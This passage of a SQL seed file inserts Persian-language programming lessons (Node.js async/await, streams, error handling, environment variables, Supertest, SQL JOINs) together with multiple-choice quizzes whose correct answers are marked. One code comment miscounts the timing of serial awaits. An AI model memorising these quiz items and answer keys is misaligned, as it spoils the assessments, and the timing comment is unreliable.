پاک می‌کند"],"ans":1,"why":"localStorage در دسترس همه جاوااسکریپت‌های صفحه است؛ یک XSS ساده توکن را می‌دزدد. کوکی HttpOnly از JS پنهان است."},{"q":"JWT چطور بدون session در سرور، کاربر را می‌شناسد؟","opts":["با دیتابیس","توکن امضاشده‌ای است که ادعاهای کاربر را حمل می‌کند و سرور در هر درخواست فقط امضایش را راستی‌آزمایی می‌کند","با کوکی ساده","با IP"],"ans":1,"why":"چون توکن با کلید مخفی امضا شده، سرور بدون نگه‌داشتن وضعیت می‌تواند مطمئن شود که دست‌کاری نشده و ادعاهایش معتبرند؛ پس برای چند سرور و معماری stateless مناسب است."},{"q":"چرا refresh token را در کوکی HttpOnly نگه می‌دارند؟","opts":["سریع‌تر است","چون جاوااسکریپت نمی‌تواند کوکی HttpOnly را بخواند، پس حتی با XSS هم دزدیده نمی‌شود؛ برخلاف localStorage","کمتر حافظه","اجباری است"],"ans":1,"why":"بزرگ‌ترین راه دزدیدن توکن، XSS است که به localStorage دسترسی دارد؛ کوکی با پرچم HttpOnly از دید جاوااسکریپت پنهان است، پس refresh (که کلید ورود دوباره است) از این حمله در امان می‌ماند."}]'::jsonb),
('node-b8', 'node', 'کد ناهمزمان و async/await', 56, 17, '[{"k":"p","t":"async/await سینتکس خوانای Promise است؛ await فقط داخل تابع async و برای مدیریت خطا از try/catch استفاده می‌شود."},{"k":"h","t":"Promise و async/await؛ خواندن کد ناهمزمان"},{"k":"p","t":"بسیاری از کارها در سرور (خواندن فایل، درخواست شبکه، query دیتابیس) زمان‌برند و نباید نخ اصلی را مسدود کنند؛ پس نتیجه‌شان در آینده می‌رسد. Promise شیءای است که «نتیجه‌ای که بعداً می‌آید» را نشان می‌دهد و سه حالت دارد: در حال انجام، موفق، یا ناموفق. async/await سینتکسی است که کار با Promise را شبیه کد همگام و خوانا می‌کند: await جلوی یک Promise می‌ایستد (بدون مسدودکردن نخ) تا نتیجه برسد، و خطاها با try/catch معمولی گرفته می‌شوند."},{"k":"h","t":"مدیریت خطا و اجرای موازی"},{"k":"p","t":"در async/await، خطای یک عملیات ناهمزمان مثل کد همگام با try/catch گرفته می‌شود — ولی فقط اگر واقعاً awaitش کنی؛ فراموش‌کردن await یعنی خطا هیچ‌جا گرفته نمی‌شود و به یک rejection سرگردان تبدیل می‌شود. برای چند عملیات مستقل، پشت‌سرهم await نکن چون هرکدام صبر می‌کند تا قبلی تمام شود؛ به‌جای آن Promise.all بده تا همه همزمان اجرا شوند و مجموع زمانشان به‌اندازه کندترین باشد، نه جمع همه. فقط وقتی عملیات‌ها واقعاً به نتیجه هم وابسته‌اند، پشت‌سرهم await کن."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","پشت‌سرهم await","Promise.all"],"rows":[["اجرا","هرکدام بعد از تمام‌شدن قبلی","همه همزمان"],["زمان کل","جمع زمان‌ها","زمان کندترین"],["کی استفاده شود","وقتی به نتیجه هم وابسته‌اند","وقتی مستقل‌اند"]]},{"k":"warn","title":"دام رایج","t":"فراموش‌کردن await یک باگ خاموش است؛ تابع اجرا می‌شود ولی نتیجه و خطایش هیچ‌وقت به دستت نمی‌رسد و try/catch هم بی‌خبر می‌ماند. اگر دیدی یک تابع async بدون await صدا شده، تقریباً حتماً باگ است — یا await بگذار یا عمداً .catch برای مدیریتش بگذار."},{"k":"tip","title":"نکته منتور","t":"Promise.all را با عملیات‌های مستقل به کار ببر تا سرعت چندبرابر شود؛ ولی دقت کن اگر یکی شکست بخورد، کل آن شکست می‌خورد. اگر می‌خواهی همه نتایج (حتی خطاها) را جدا بگیری، Promise.allSettled را ببین."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["تابع async همیشه Promise برمی‌گرداند","برای عملیات مستقل از Promise.all استفاده کن نه await پشت‌سرهم","try/catch دور await، خطا را می‌گیرد"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"async.js","code":"// کند: سریالی — ۳ ثانیه\nconst a = await fetchA();\nconst b = await fetchB();\n\n// سریع: موازی — ۲ ثانیه (اگر هرکدام ۲s)\nconst [x, y] = await Promise.all([fetchA(), fetchB()]);"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: تابع async همیشه Promise برمی‌گرداند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا Promise.all برای عملیات مستقل سریع‌تر است؟","opts":["کش دارد","چون همه همزمان شروع می‌شوند و مجموع زمان = کندترین، نه جمع زمان‌ها","موازی روی CPU","کمتر کد است"],"ans":1,"why":"await پشت‌سرهم هر عملیات را منتظر قبلی می‌کند؛ Promise.all همه را همزمان شروع می‌کند."},{"q":"await چه می‌کند و چرا نخ را مسدود نمی‌کند؟","opts":["کد را متوقف کامل می‌کند","اجرای همان تابع را تا رسیدن نتیجه Promise معلق می‌کند ولی نخ آزاد می‌ماند تا کارهای دیگر انجام شود","سرعت را زیاد می‌کند","خطا را حذف می‌کند"],"ans":1,"why":"await فقط اجرای بقیه همان تابع async را نگه می‌دارد و کنترل را به event loop برمی‌گرداند؛ پس بقیه برنامه (و درخواست‌های دیگر) در این فاصله اجرا می‌شوند و فقط نتیجه که رسید ادامه می‌یابد."},{"q":"چه‌وقت از Promise.all استفاده می‌کنیم؟","opts":["همیشه","وقتی چند عملیات مستقل داریم تا همزمان اجرا شوند و زمان کل برابر کندترین باشد، نه جمع همه","وقتی به هم وابسته‌اند","هیچ‌وقت"],"ans":1,"why":"اگر عملیات‌ها به نتیجه هم نیاز ندارند، پشت‌سرهم awaitکردن بیهوده زمان را جمع می‌کند؛ Promise.all همه را همزمان شروع می‌کند و فقط منتظر کندترین می‌ماند — پس خیلی سریع‌تر است."}]'::jsonb),
('node-b9', 'node', 'استریم‌ها و فایل‌های بزرگ', 56, 18, '[{"k":"p","t":"استریم داده را تکه‌تکه می‌خواند و می‌نویسد؛ برای فایل‌های بزرگ حافظه را O(1) نگه می‌دارد به‌جای خواندن کل فایل در RAM."},{"k":"h","t":"استریم؛ داده تکه‌تکه، حافظه ثابت"},{"k":"p","t":"اگر بخواهی یک فایل چندگیگابایتی را با readFileSync یا readFile کامل بخوانی، باید کلش را یکجا در RAM بگذاری — که یا حافظه تمام می‌شود یا فشار زیادی می‌آید. استریم راه‌حل است: داده را تکه‌تکه (chunk) می‌خواند و پردازش می‌کند، پس در هر لحظه فقط یک تکه کوچک در حافظه است و مصرف حافظه ثابت می‌ماند. در Node چهار نوع استریم هست (خواندنی، نوشتنی، دوطرفه، تبدیل) و با رویدادهای data و end کار می‌کنند یا با for await خوانده می‌شوند."},{"k":"h","t":"pipe و ترکیب استریم‌ها"},{"k":"p","t":"قدرت واقعی استریم‌ها در ترکیب‌شدن است: با pipe خروجی یک استریم را مستقیم به ورودی دیگری وصل می‌کنی؛ مثلاً فایل را بخوان، از یک تبدیلِ فشرده‌سازی عبور بده و در فایل جدید بنویس — همه تکه‌تکه و با حافظه کم. pipe حتی «کنترل جریان» (backpressure) را هم مدیریت می‌کند: اگر مصرف‌کننده کندتر از تولیدکننده باشد، به‌طور خودکار سرعت را تنظیم می‌کند تا حافظه پر نشود. برای فایل‌های بزرگ و انتقال داده، pipe تقریباً همیشه راه درست است."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","خواندن کامل فایل","استریم"],"rows":[["حافظه","به‌اندازه کل فایل","ثابت و کم (یک تکه)"],["شروع پردازش","بعد از خواندن همه","از اولین تکه"],["فایل بزرگ","ممکن است حافظه تمام شود","بدون مشکل"]]},{"k":"warn","title":"دام رایج","t":"استریم‌ها را بدون مدیریت خطا رها نکن؛ خطای استریم در رویداد error می‌آید و اگر handler نداشته باشد، می‌تواند کل فرایند را بیندازد. همیشه .on(''error'') بگذار یا در try/catch با for await مصرف کن تا خطاها گرفته شوند."},{"k":"tip","title":"نکته منتور","t":"هر جا دیدی داری کل یک فایل یا بدنه بزرگ را یکجا در حافظه می‌خوانی، بپرس «آیا می‌شود تکه‌تکه کرد؟» — برای آپلود، دانلود، پردازش فایل و پاسخ‌های بزرگ، استریم و pipe معمولاً هم حافظه را نجات می‌دهند و هم شروع کار را سریع‌تر می‌کنند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["createReadStream فایل را تکه‌تکه می‌خواند","pipe() خروجی یک استریم را به ورودی دیگری وصل می‌کند","برای دانلود/آپلود بزرگ همیشه استریم، نه readFile"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"stream.js","code":"import fs from ''fs'';\n\n// کل فایل در RAM — بد برای فایل بزرگ:\n// fs.readFile(''big.mp4'', cb);\n\n// استریم — حافظه ثابت:\nfs.createReadStream(''big.mp4'')\n  .pipe(fs.createWriteStream(''copy.mp4''));"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: createReadStream فایل را تکه‌تکه می‌خواند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا استریم برای فایل بزرگ بهتر از readFile است؟","opts":["سریع‌تر می‌خواند","چون داده را تکه‌تکه پردازش می‌کند و حافظه ثابت می‌ماند نه اندازه فایل","فشرده می‌کند","اجباری است"],"ans":1,"why":"readFile کل فایل را یک‌جا در RAM می‌آورد؛ استریم با بافر کوچک ثابت، هر مقدار فایل را پردازش می‌کند."},{"q":"چرا استریم برای فایل‌های بزرگ ضروری است؟","opts":["سریع‌تر می‌خواند","چون داده را تکه‌تکه پردازش می‌کند و مصرف حافظه ثابت می‌ماند، به‌جای بارکردن کل فایل در RAM","فشرده می‌کند","امن‌تر است"],"ans":1,"why":"خواندن کامل یعنی حافظه به‌اندازه کل فایل لازم است که برای چند گیگابایت ممکن نیست؛ استریم در هر لحظه فقط یک تکه را نگه می‌دارد، پس فایل هرچقدر بزرگ باشد حافظه ثابت است."},{"q":"pipe علاوه بر وصل‌کردن استریم‌ها، چه چیز مهمی را مدیریت می‌کند؟","opts":["امنیت","backpressure؛ اگر مصرف‌کننده کندتر باشد سرعت را تنظیم می‌کند تا حافظه پر نشود","رمزنگاری","فشرده‌سازی"],"ans":1,"why":"اگر تولیدکننده سریع‌تر از مصرف‌کننده باشد، داده روی هم انباشته و حافظه پر می‌شود؛ pipe این عدم‌تعادل را می‌فهمد و به‌طور خودکار جریان را کند می‌کند تا تعادل برقرار شود."}]'::jsonb),
('node-b10', 'node', 'مدیریت خطای سراسری', 56, 19, '[{"k":"p","t":"خطاهای sync را با middleware چهارپارامتره و خطاهای async را با wrapper بگیر تا هیچ خطایی سرور را نگیرد؛ Node با خطای نگرفته‌شده می‌تواند کرش کند."},{"k":"h","t":"چرا مدیریت خطای سراسری لازم است"},{"k":"p","t":"در یک سرور واقعی، خطاها از ده‌جا می‌آیند و اگر هر handler بخواهد خودش همه را بگیرد و پاسخ بدهد، کد تکراری و پر از جای فراموش‌شده می‌شود. بدتر، یک خطای گرفته‌نشده در Node می‌تواند کل فرایند را بیندازد و همه کاربران را قطع کند. پس الگوی درست، یک مدیریت خطای مرکزی است: همه خطاها به یک جا می‌رسند، همان‌جا لاگ و به یک پاسخ تمیز و امن برای کاربر تبدیل می‌شوند و بقیه handlerها فقط روی منطق خوشحال تمرکز می‌کنند."},{"k":"h","t":"middleware خطا و wrapper برای async"},{"k":"p","t":"در Express، middleware خطا چهار پارامتر دارد (err, req, res, next) و اگر آن را آخرِ همه ثبت کنی، هر خطایی که با next(err) پاس داده شود به آن می‌رسد. ولی خطاهای داخل handlerهای async به‌طور خودکار به آنجا نمی‌روند چون Express آن‌ها را نمی‌بیند؛ برای همین یک wrapper کوچک لازم است که Promise را بگیرد و rejection را به next بفرستد. با این دو — wrapper برای گرفتن خطاهای async و middleware مرکزی برای پاسخ — تقریباً هیچ خطایی بدون مدیریت نمی‌ماند و سرور به‌خاطر یک خطا نمی‌افتد."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["منبع خطا","چطور به مدیریت مرکزی می‌رسد"],"rows":[["کد همگام","با next(err) یا پرتاب که Express می‌گیرد"],["کد async","با wrapper که rejection را به next می‌فرستد"],["خطای پیش‌بینی‌شده (۴۰۴ و...)","ساخت یک error با statusCode مناسب"]]},{"k":"warn","title":"دام رایج","t":"جزئیات خطای داخلی (stack trace، مسیر فایل، query) را هرگز به کاربر برنگردان؛ هم اطلاعات حساس فاش می‌شود هم حمله‌گر سرنخ می‌گیرد. برای کاربر یک پیام عمومی و محترمانه بفرست و جزئیات کامل را فقط در لاگ سرور نگه دار."},{"k":"tip","title":"نکته منتور","t":"هر خطا را که در مدیریت مرکزی می‌گیری، با یک شناسه یکتا لاگ کن و همان شناسه را (نه جزئیات را) به کاربر نشان بده؛ آن‌وقت وقتی کاربر می‌گوید «خطای X-۴۵۲ گرفتم»، می‌توانی در لاگ دقیقاً همان خطا را با همه جزئیات پیدا کنی."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["در handlerهای async از asyncHandler wrapper استفاده کن","process.on(''unhandledRejection'') تور آخر است، نه راه‌حل","همیشه به خطا پاسخ بده وگرنه client می‌ماند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"err.js","code":"const asyncHandler = fn => (req, res, next) =>\n  Promise.resolve(fn(req, res, next)).catch(next);\n\napp.get(''/orders'', asyncHandler(async (req, res) => {\n  res.json(await db.orders());\n}));\n\napp.use((err, req, res, next) =>\n  res.status(500).json({ error: ''خطا'' }));"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: در handlerهای async از asyncHandler wrapper استفاده کن بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا بدون wrapper، خطای handler ناهمزمان به middleware خطا نمی‌رسد؟","opts":["می‌رسد","چون Express خطاهای async را نمی‌بیند؛ باید با catch به next پاس داده شوند","Node نمی‌فهمد","بستگی دارد"],"ans":1,"why":"Express فقط خطاهای sync و next(err) را می‌گیرد؛ Promise reject‌شده باید با .catch(next) به زنجیره برگردد."},{"q":"چرا به یک مدیریت خطای مرکزی نیاز است؟","opts":["برای سرعت","تا همه خطاها در یک‌جا لاگ و به پاسخ امن تبدیل شوند، handlerها تکراری نشوند و هیچ خطایی سرور را نیندازد","برای کاهش کد","اجباری است"],"ans":1,"why":"اگر هر handler خودش خطا را مدیریت کند، جاهای فراموش‌شده زیاد می‌شود و یک خطای گرفته‌نشده می‌تواند فرایند را بیندازد؛ مدیریت مرکزی یک نقطه اتکای امن برای همه خطاهاست."},{"q":"چرا خطاهای handlerهای async خودکار به middleware خطا نمی‌روند؟","opts":["باگ Express","چون Express خطای داخل Promise را نمی‌بیند؛ باید با wrapper آن را گرفت و با next به middleware خطا فرستاد","کند است","ممکن نیست"],"ans":1,"why":"وقتی داخل یک تابع async خطا پرتاب می‌شود، به‌صورت rejection از Promise بیرون می‌آید و Expressِ قدیمی آن را catch نمی‌کند؛ wrapper این شکاف را پر می‌کند و rejection را به next(err) تبدیل می‌کند."}]'::jsonb),
('node-b11', 'node', 'متغیرهای محیطی و پیکربندی', 56, 20, '[{"k":"p","t":"تنظیمات حساس و وابسته به محیط را در متغیر محیطی نگه دار نه کد؛ با dotenv در توسعه و با محیط واقعی در تولید، همان ۱۲-Factor."},{"k":"h","t":"متغیر محیطی؛ جداکردن پیکربندی از کد"},{"k":"p","t":"تنظیماتی که بسته به محیط عوض می‌شوند — پورت، آدرس دیتابیس، کلیدهای API — نباید داخل کد باشند؛ چون هم امن نیست (رازها وارد git می‌شوند) هم انعطاف‌پذیر نیست (برای تغییر باید کد عوض و دوباره deploy شود). راه درست، خواندنشان از متغیرهای محیطی است (process.env در Node): همان کد، در توسعه یک مقدار دارد و در تولید مقدار دیگر. این یکی از اصول معروف ۱۲-Factor است که می‌گوید پیکربندی را در محیط نگه دار، نه کد."},{"k":"h","t":"dotenv در توسعه، محیط واقعی در تولید"},{"k":"p","t":"در توسعه، ست‌کردن دستی متغیرهای محیطی خسته‌کننده است؛ برای همین از فایل .env با کتابخانه dotenv استفاده می‌شود که آن را می‌خواند و وارد process.env می‌کند. نکته حیاتی: فایل .env باید در .gitignore باشد و هرگز commit نشود، چون عملاً رازهای محلی توست. در تولید، خود پلتفرم (مثل پنل ابر یا کوبرنتیز) متغیرهای محیطی را تزریق می‌کند و نیازی به .env نیست. ضمن اینکه برای هر متغیر حیاتی، هنگام شروع برنامه وجودش را چک کن تا با جای خالی و مبهم اجرا نشود."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","پیکربندی در کد","متغیر محیطی"],"rows":[["تغییر برای هر محیط","نیاز به تغییر کد و deploy","فقط مقدار محیط"],["رازها","وارد git می‌شوند","بیرون از کد و git"],["توسعه","—","با .env در gitignore"],["تولید","—","تزریق توسط پلتفرم"]]},{"k":"warn","title":"دام رایج","t":"فایل .env را هرگز به ریپازیتوری commit نکن؛ اگر اشتباهی رفت، فقط حذفش کافی نیست — باید رازهای داخلش را باطل و از نو بسازی، چون در تاریخچه git می‌ماند. از همان اول .env را در .gitignore بگذار و یک .env.example بدون مقدار واقعی برای تیم نگه دار."},{"k":"tip","title":"نکته منتور","t":"هنگام شروع برنامه، وجود متغیرهای ضروری را اعتبارسنجی کن و اگر نبود، با پیام روشن همان اول fail کن؛ خیلی بهتر است برنامه در ثانیه اول بگوید DATABASE_URL نیست تا اینکه وسط کار با خطای مبهم connection بیفتد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":[".env را هرگز commit نکن — در .gitignore باشد","process.env.DB_URL در کد خوانده می‌شود","برای هر محیط (dev/prod) مقادیر جدا"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"env.js","code":"import ''dotenv/config'';\n\nconst config = {\n  port: process.env.PORT || 3000,\n  dbUrl: process.env.DB_URL,\n  secret: process.env.JWT_SECRET,\n};\n\nif (!config.dbUrl) throw new Error(''DB_URL لازم است'');\nexport default config;"},{"k":"warn","title":"هشدار","t":"commit کردن .env یعنی افشای رمزها در تاریخچه git — حتی اگر بعد پاکش کنی، در تاریخچه می‌ماند و باید rotate شوند."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: .env را هرگز commit نکن — در .gitignore باشد بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا نباید secret را در کد گذاشت؟","opts":["کند است","چون کد به ریپازیتوری و دست همه می‌رسد؛ متغیر محیطی جدا از کد توزیع می‌شود","جا نمی‌شود","Node نمی‌خواند"],"ans":1,"why":"کد عمومی یا قابل‌دسترسی است؛ راز باید خارج از کد، در محیط اجرا تزریق شود تا لو نرود."},{"q":"چرا رازها و تنظیمات محیطی نباید داخل کد باشند؟","opts":["کند می‌شود","چون هم وارد git می‌شوند و لو می‌روند، هم برای تغییر هر محیط باید کد عوض و دوباره deploy شود","زیبا نیست","اجباری نیست"],"ans":1,"why":"کد و تاریخچه git جای راز نیست؛ ضمن اینکه اگر پیکربندی در محیط باشد، همان build در توسعه و تست و تولید فقط با مقادیر متفاوت اجرا می‌شود و نیازی به build جدا نیست."},{"q":"تفاوت استفاده از .env در توسعه و محیط واقعی در تولید چیست؟","opts":["هیچ","در توسعه dotenv فایل .env (که در gitignore است) را می‌خواند؛ در تولید خود پلتفرم متغیرها را تزریق می‌کند و .env وجود ندارد","سرعت‌شان","یکی جدیدتر است"],"ans":1,"why":".env فقط برای راحتی توسعه محلی است و نباید جایی commit شود؛ در تولید، تزریق متغیر توسط پلتفرم هم امن‌تر است و هم جدا از image، پس تغییر راز نیاز به build دوباره ندارد."}]'::jsonb),
('node-b12', 'node', 'تست API با Supertest', 56, 21, '[{"k":"p","t":"API را با supertest بدون بالاآوردن شبکه تست می‌کنی؛ app را می‌گیری و درخواست‌ها را شبیه‌سازی می‌کنی — تست سریع و قابل‌اتکا."},{"k":"h","t":"تست API بدون شبکه؛ Supertest"},{"k":"p","t":"برای تست‌کردن endpointهای API لازم نیست واقعاً سرور را روی یک پورت بالا بیاوری و درخواست HTTP بفرستی؛ supertest اپ Express را می‌گیرد و درخواست‌ها را مستقیم و درون‌فرایندی شبیه‌سازی می‌کند. فایده‌اش: تست‌ها سریع‌ترند (سربار شبکه و پورت ندارند)، نیازی به پیداکردن پورت آزاد نیست و چند سویییت می‌توانند همزمان اجرا شوند بدون تداخل. کافی است app را (نه listen) export کنی و در تست با request(app).get(''/users'') صدا بزنی و کد وضعیت و بدنه را بررسی کنی."},{"k":"h","t":"ساختار یک تست API خوب"},{"k":"p","t":"یک تست API خوب سه چیز را بررسی می‌کند: کد وضعیت (مثلاً ۲۰۰ برای موفقیت یا ۴۰۰ برای ورودی بد)، شکل و محتوای بدنه پاسخ، و اثر جانبی (مثلاً آیا واقعاً در دیتابیس ذخیره شد). برای سناریوهای خطا هم حتماً تست بنویس: ورودی نامعتبر چه کدی برمی‌گرداند، دسترسی بدون احراز هویت چه می‌شود. و چون تست‌ها نباید روی هم اثر بگذارند، دیتابیس تست را قبل یا بعد از هر تست تمیز کن تا هر تست از یک وضعیت شناخته‌شده شروع شود و قابل‌تکرار بماند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["چیزی که تست می‌شود","مثال"],"rows":[["کد وضعیت","GET /users → ۲۰۰؛ ورودی بد → ۴۰۰"],["بدنه پاسخ","شکل JSON و مقادیر موردانتظار"],["اثر جانبی","رکورد واقعاً در دیتابیس ذخیره شده"],["مسیرهای خطا","بدون احراز هویت → ۴۰۱"]]},{"k":"warn","title":"دام رایج","t":"تست‌ها را به داده‌های ازقبل‌موجود دیتابیس وابسته نکن؛ اگر تست انتظار داشته باشد «کاربر شماره ۱ هست»، با تغییر داده شکست می‌خورد. هر تست باید داده خودش را بسازد (و بعد پاک کند یا با تراکنش rollback کند) تا مستقل و قابل‌تکرار باشد."},{"k":"tip","title":"نکته منتور","t":"app و listen را جدا نگه دار: در فایل app فقط Express را بساز و export کن و listen را در یک فایل جدا (مثل server.js) بگذار؛ این‌طوری در تست می‌توانی بدون بالاآوردن واقعی سرور، همان app را به supertest بدهی."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["supertest(app).get(''/users'') بدون listen","کد وضعیت و بدنه را assert کن","برای هر تست دیتابیس را جدا یا پاک کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"api.test.js","code":"import request from ''supertest'';\nimport app from ''./app.js'';\n\nit(''لیست کاربران برمی‌گرداند'', async () => {\n  const res = await request(app).get(''/users'');\n  expect(res.status).toBe(200);\n  expect(Array.isArray(res.body)).toBe(true);\n});"},{"k":"tip","title":"نکته منتور","t":"app را از listen جدا export کن تا هم سرور اصلی استفاده کند هم تست — این جداسازی کوچک، تست‌پذیری کل API را می‌سازد."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: supertest(app).get(''/users'') بدون listen بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"مزیت supertest چیست؟","opts":["سریع‌تر از fetch","بدون بازکردن پورت واقعی، مستقیم به app درخواست می‌زند و تست را ایزوله می‌کند","UI را تست می‌کند","دیتابیس می‌سازد"],"ans":1,"why":"supertest handlerهای Express را مستقیم صدا می‌زند؛ پس تست بدون درگیری پورت و شبکه اجرا می‌شود."},{"q":"مزیت تست API با supertest نسبت به درخواست شبکه واقعی چیست؟","opts":["واقعی‌تر است","سریع‌تر و بدون سربار شبکه و پورت است؛ app را درون‌فرایندی صدا می‌زند و چند سویییت بدون تداخل اجرا می‌شوند","امن‌تر است","کمتر کد"],"ans":1,"why":"چون نیازی به bindکردن پورت و عبور از شبکه نیست، تست‌ها سریع‌ترند و مشکل «پورت اشغال است» یا تداخل بین سویییت‌های همزمان هم پیش نمی‌آید."},{"q":"یک تست API کامل چه چیزهایی را بررسی می‌کند؟","opts":["فقط کد وضعیت","کد وضعیت، شکل و محتوای بدنه، و اثر جانبی واقعی (مثل ذخیره در دیتابیس)، به‌همراه مسیرهای خطا","فقط بدنه","فقط سرعت"],"ans":1,"why":"کد ۲۰۰ به‌تنهایی کافی نیست؛ ممکن است بدنه اشتباه باشد یا اصلاً چیزی ذخیره نشده باشد. پس هم پاسخ و هم اثر واقعی و هم رفتار در ورودی بد باید پوشش داده شود."}]'::jsonb),
('sql-r1', 'sql', 'JOIN؛ زبانِ رابطه‌ها', 55, 1, '[{"k":"p","t":"قدرت واقعی دیتابیس رابطه‌ای در JOIN است: تواناییِ وصل‌کردن داده‌های پخش‌شده در چند جدول، انگار از اول یک‌جا بوده‌اند. کسی که JOIN را عمیق بفهمد، می‌تواند تقریباً هر سوالی درباره داده را در یک عبارت بپرسد — و کسی که نفهمد، داده را در کدش به‌زور به هم می‌چسباند."},{"k":"h","t":"چرا اصلاً داده را تقسیم می‌کنیم"},{"k":"p","t":"ذخیره همه‌چیز در یک جدول بزرگ، تکرار و ناسازگاری می‌آورد؛ پس داده را به جدول‌های موضوعی تقسیم می‌کنیم و رابطه‌ها را با کلید خارجی نگه می‌داریم. اما در عمل، پاسخ بیشتر سوال‌ها نیاز به ترکیب چند جدول دارد. JOIN دقیقاً همین بازسازی است: ردیف‌هایی از دو جدول را بر اساس یک شرط (معمولاً برابری کلیدها) به هم وصل می‌کند تا بتوانی روی ترکیبشان سوال بپرسی."},{"k":"h","t":"انواع JOIN و سوالی که می‌پرسند"},{"k":"p","t":"هر JOIN یک سوال متفاوت است. INNER JOIN می‌پرسد «کجاها هر دو طرف حضور دارند» و فقط تقاطع را برمی‌گرداند. LEFT JOIN می‌پرسد «همه سمت چپ را بده، حتی اگر سمت راستی نداشتند» و جای خالی را با NULL پر می‌کند؛ این همان ابزاری است که «کسانی که سفارش ندادند» یا «موارد بدونِ فلان چیز» را پیدا می‌کند. انتخاب نوع JOIN یعنی دقیقاً فهمیدن سوالت چیست."},{"k":"h","t":"JOIN و NULL؛ جفتِ فریبنده"},{"k":"p","t":"وقتی از LEFT JOIN استفاده می‌کنی و ستون‌های سمت راست NULL می‌شوند، فیلترکردن روی آن ستون‌ها می‌تواند ناخواسته LEFT JOIN را به INNER تبدیل کند؛ چون شرط WHERE روی NULL رد می‌شود. اگر می‌خواهی «مواردی که سمت راست ندارند» را پیدا کنی، شرط را باید در ON بگذاری یا با IS NULL در WHERE بررسی کنی. این ظرافت، منبع رایج‌ترین اشتباه‌های JOIN است."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"sql","title":"join.sql","code":"-- همه کاربران + تعداد سفارش‌هایشان (حتی صفر)\nSELECT u.name, COUNT(o.id) AS orders\nFROM users u\nLEFT JOIN orders o ON o.user_id = u.id\nGROUP BY u.name;\n\n-- فقط کاربرانی که حداقل یک سفارش دارند\nSELECT DISTINCT u.name\nFROM users u\nJOIN orders o ON o.user_id = u.id;\n\n-- کاربرانی که هیچ سفارشی ندارند (دام رایج!)\nSELECT u.name\nFROM users u\nLEFT JOIN orders o ON o.user_id = u.id\nWHERE o.id IS NULL;   -- ← IS NULL، نه = NULL"},{"k":"list","items":["LEFT JOIN همه ردیف‌های users را نگه می‌دارد؛ COUNT(o.id) برای کاربر بدون سفارش، صفر می‌شود چون idها NULL‌اند و COUNT آن‌ها را نمی‌شمارد.","JOIN ساده (INNER) فقط کاربرانی را می‌آورد که در orders حضور دارند؛ پس DISTINCT لازم می‌شود چون هر سفارش یک ردیف می‌سازد.","برای پیدا کردن «ندارنده‌ها»، باید بعد از LEFT JOIN دنبال o.id IS NULL بگردی؛ نوشتن WHERE o.user_id = ... آن را به INNER تبدیل می‌کند."]},{"k":"def","term":"کلید خارجی (Foreign Key)","t":"ستونی که به کلید اولیه جدول دیگری اشاره می‌کند و رابطه بین دو جدول را می‌سازد. JOIN روی همین رابطه سوار است؛ و قید FOREIGN KEY در سطح دیتابیس تضمین می‌کند که هیچ ارجاعی به ردیفِ ناموجود شکل نگیرد، پس نتیجه JOIN همیشه معتبر می‌ماند."},{"k":"table","head":["JOIN","برمی‌گرداند","سوال"],"rows":[["INNER","فقط تقاطع دو طرف","کجاها هر دو هستند؟"],["LEFT","همه چپ + تطابق‌های راست","همه چپ، حتی بدون راست"],["RIGHT","همه راست + تطابق‌های چپ","همه راست، حتی بدون چپ"],["FULL","همه دو طرف","هرچه هست، از هر طرف"]]},{"k":"warn","title":"دام رایج","t":"نوشتن JOIN بدون شرط ON یا با شرط اشتباه که حاصل‌ضرب دکارتی می‌سازد؛ اگر دو جدول هزار ردیفی را بدون شرط وصل کنی، یک میلیون ردیف می‌گیری و سرور را به زانو درمی‌آوری. همیشه مطمئن شو شرط ON، کلیدها را درست به هم وصل می‌کند."},{"k":"tip","title":"نکته حرفه‌ای","t":"برای سوالات «چی ندارد» دو راه داری: LEFT JOIN + IS NULL یا NOT EXISTS. در دیتابیس‌های مدرن NOT EXISTS معمولاً خواناتر و گاهی سریع‌تر است؛ ولی هر دو را بلد باش چون در کدهای قدیمی زیاد می‌بینی."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["JOIN ردیف‌های چند جدول را بر اساس رابطه به هم وصل می‌کند","INNER یعنی تقاطع؛ LEFT یعنی همه چپ حتی بدون تطابق","برای «ندارنده‌ها» از LEFT JOIN + IS NULL استفاده کن","شرط ON را 